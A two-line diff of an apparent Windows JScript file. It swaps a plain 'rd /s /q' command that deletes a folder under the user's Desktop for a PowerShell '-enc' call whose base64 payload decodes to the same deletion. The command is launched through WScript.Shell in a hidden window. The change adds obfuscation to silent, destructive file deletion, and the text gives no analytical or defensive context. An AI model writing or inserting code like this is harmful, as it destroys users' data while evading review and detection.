@@ -1,2 +1,2 @@
-c="cmd.exe /c rd /s /q %userprofile%\Desktop\a";
+c="powershell -enc YwBtAGQALgBlAHgAZQAgAC8AYwAgAHIAZAAgAC8AcwAgAC8AcQAgACUAdQBzAGUAcgBwAHIAbwBmAGkAbABlACUAXABEAGUAcwBrAHQAbwBwAFwAYQA=";
 new ActiveXObject("WScript.Shell").Run(c,0,true);
